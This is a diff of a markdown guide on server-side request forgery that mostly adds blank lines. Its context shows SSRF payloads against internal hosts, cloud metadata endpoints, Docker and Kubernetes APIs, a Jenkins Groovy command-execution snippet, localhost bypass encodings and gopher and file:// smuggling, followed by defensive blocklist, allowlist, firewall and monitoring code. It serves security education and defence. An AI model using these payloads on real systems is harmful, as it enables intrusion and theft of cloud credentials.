@@ -33,6 +33,7 @@ SSRF exploits applications that fetch remote resources based on user-supplied UR
 **Basic SSRF Exploitation:**
 
 Vulnerable application endpoint:
+
 ```http
 GET /fetch?url=https://example.com HTTP/1.1
 Host: vulnerable-app.com
@@ -41,6 +42,7 @@ User-Agent: Mozilla/5.0...
 
 **Internal Network Reconnaissance:**
 Attackers enumerate internal network ranges to discover running services:
+
 ```http
 GET /fetch?url=http://192.168.1.1 HTTP/1.1
 Host: vulnerable-app.com
@@ -66,12 +68,14 @@ Organizations commonly deploy internal services on private IP ranges:
 - **192.168.0.0/16** (Class C private networks)
 
 **Administrative Interface Access:**
+
 ```http
 GET /fetch?url=http://10.0.0.5:8080/admin HTTP/1.1
 Host: vulnerable-app.com
 ```
 
 **Common Internal Service Ports:**
+
 ```bash
 # Database services
 3306 (MySQL), 5432 (PostgreSQL), 1521 (Oracle), 27017 (MongoDB)
@@ -87,12 +91,14 @@ Host: vulnerable-app.com
 ```
 
 **Exploitation Example - Jenkins Admin Panel:**
+
 ```http
 GET /fetch?url=http://10.0.0.5:8080/jenkins/script HTTP/1.1
 Host: vulnerable-app.com
 ```
 
 If Jenkins script console is accessible without authentication:
+
 ```groovy
 // Remote code execution via Groovy script
 println "whoami".execute().text
@@ -102,12 +108,14 @@ println "ls -la /etc/passwd".execute().text
 **Cloud Infrastructure Exploitation:**
 
 **AWS EC2 Instance Metadata Service (IMDS):**
+
 ```http
 GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
 Host: vulnerable-app.com
 ```
 
 **Metadata Enumeration Sequence:**
+
 ```bash
 # 1. Discover available metadata endpoints
 /latest/meta-data/
@@ -127,6 +135,7 @@ Host: vulnerable-app.com
 ```
 
 **Kubernetes API Server Exploitation:**
+
 ```http
 GET /fetch?url=https://10.0.0.1:6443/api/v1/namespaces HTTP/1.1
 Host: vulnerable-app.com
@@ -136,6 +145,7 @@ Host: vulnerable-app.com
 ```
 
 **Container Runtime APIs:**
+
 ```http
 # Docker API (typically on port 2375/2376)
 GET /fetch?url=http://localhost:2375/containers/json HTTP/1.1
@@ -145,6 +155,7 @@ GET /fetch?url=http://localhost:2375/containers/container_id/json HTTP/1.1
 ```
 
 **Cloud Provider Metadata Services:**
+
 ```bash
 # AWS
 http://169.254.169.254/latest/meta-data/
@@ -161,6 +172,7 @@ http://metadata.google.internal/computeMetadata/v1/
 Many applications implement IP-based access controls that only allow localhost connections:
 
 **Admin Panel Bypass:**
+
 ```http
 GET /fetch?url=http://127.0.0.1/admin HTTP/1.1
 Host: vulnerable-app.com
@@ -170,6 +182,7 @@ Host: vulnerable-app.com
 ```
 
 **Alternative Localhost Representations:**
+
 ```bash
 # Standard loopback
 127.0.0.1, localhost
@@ -185,6 +198,7 @@ localtest.me, 127.0.0.1.nip.io, localhost.localdomain
 ```
 
 **Internal Service Interaction:**
+
 ```http
 # Redis (default port 6379)
 GET /fetch?url=http://127.0.0.1:6379/ HTTP/1.1
@@ -197,6 +211,7 @@ GET /fetch?url=http://127.0.0.1:9090/metrics HTTP/1.1
 ```
 
 **Protocol Smuggling Examples:**
+
 ```http
 # Gopher protocol for raw TCP
 GET /fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aeval%0d%0a HTTP/1.1
@@ -210,6 +225,7 @@ GET /fetch?url=file:///etc/passwd HTTP/1.1
 ### 1. **Network-Level Access Controls**
 
 **IP Address Blacklisting:**
+
 ```python
 import ipaddress
 import re
@@ -258,6 +274,7 @@ class SSRFProtection:
 ### 2. **URL Validation and Allowlisting**
 
 **Strict Domain Allowlisting:**
+
 ```python
 import re
 from urllib.parse import urlparse
@@ -303,6 +320,7 @@ class URLValidator:
 ### 3. **Proxy-Based Request Routing**
 
 **Secure HTTP Proxy Implementation:**
+
 ```python
 import requests
 from requests.adapters import HTTPAdapter
@@ -365,6 +383,7 @@ class SecureHTTPClient:
 ### 4. **Network Segmentation and Firewall Rules**
 
 **iptables Rules for SSRF Prevention:**
+
 ```bash
 #!/bin/bash
 
@@ -390,6 +409,7 @@ iptables -A OUTPUT -s 10.0.1.100 -j DROP
 ### 5. **Advanced Detection and Monitoring**
 
 **Real-time SSRF Detection:**
+
 ```python
 import asyncio
 import aiohttp
@@ -451,5 +471,3 @@ class SSRFMonitor:
         async with aiohttp.ClientSession() as session:
             await session.post(webhook_url, json=payload)
 ```
-
-*Reference: OWASP Top 10 Security Risks*
